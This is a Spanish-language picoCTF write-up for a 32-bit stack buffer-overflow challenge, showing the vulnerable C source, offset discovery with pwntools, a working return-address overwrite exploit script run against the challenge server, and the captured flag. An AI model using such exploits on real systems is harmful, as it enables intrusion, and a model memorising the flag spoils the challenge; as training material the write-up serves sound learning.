# Nombre Reto

## Descripcion Reto
Control the return address

Additional details will be available after launching your challenge instance.

## Pistas
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Solución
```bash
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ wget 'https://artifacts.picoctf.net/c/187/vuln'
--2023-05-14 15:34:14--  https://artifacts.picoctf.net/c/187/vuln
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 18.154.132.88, 18.154.132.108, 18.154.132.32, ...
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[18.154.132.88]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 15704 (15K) [application/octet-stream]
Grabando a: «vuln»

vuln                 100%[=====================>]  15.34K  --.-KB/s    en 0.05s   

2023-05-14 15:34:27 (287 KB/s) - «vuln» guardado [15704/15704]

                                                                                   
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ wget https://artifacts.picoctf.net/c/187/vuln.c 
--2023-05-14 15:34:30--  https://artifacts.picoctf.net/c/187/vuln.c
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 18.154.132.88, 18.154.132.74, 18.154.132.32, ...
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[18.154.132.88]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 769 [application/octet-stream]
Grabando a: «vuln.c»

vuln.c               100%[=====================>]     769  --.-KB/s    en 0.004s  

2023-05-14 15:34:36 (205 KB/s) - «vuln.c» guardado [769/769]

                                                                                   
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ ls -la
total 20
drwxrwx--- 1 root vboxsf     0 may 14 15:34 .
drwxrwx--- 1 root vboxsf     0 may 14 15:33 ..
-rwxrwx--- 1 root vboxsf 15704 mar 15 21:15 vuln
-rwxrwx--- 1 root vboxsf   769 mar 15 21:15 vuln.c

┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ chmod +x vuln 
                                                                                   
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ ./vuln
Please enter your string: 
a
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

```c++
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ cat vuln.c                     
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

```bash
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ python3 -c 'from pwn import *'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ModuleNotFoundError: No module named 'pwn'
                                                                                   
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ pip install pwntools


```

```python3
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ python3                       
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *

┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ python3                       
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
```

```bash
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                   
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ objdump -D vuln -M intel | grep 'win'                 
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>

┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{dummieflag}
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln

┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ nano exp.py  
```

```python3
from pwn import *

p = remote('saturn.picoctf.net', 61438)

overflow = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'

print( p.recvuntil(':'))

p.sendline(overflow)

p.interactive()
```

```bash
┌──(kali㉿kali)-[~/hacking/picoBinary/b1]
└─$ python3 exp.py 
[+] Opening connection to saturn.picoctf.net on port 61438: Done
/home/kali/hacking/picoBinary/b1/exp.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print( p.recvuntil(':'))
b'Please enter your string:'
/home/kali/hacking/picoBinary/b1/exp.py:9: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(overflow)
[*] Switching to interactive mode
 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}[*] Got EOF while reading in interactive
```

## Bandera
* picoCTF{addr3ss3s_ar3_3asy_0195a40f}

## Notas adicionales
| Comando | Descripcion |
|---------|-------------|
|  |  |

## Referencias
- []()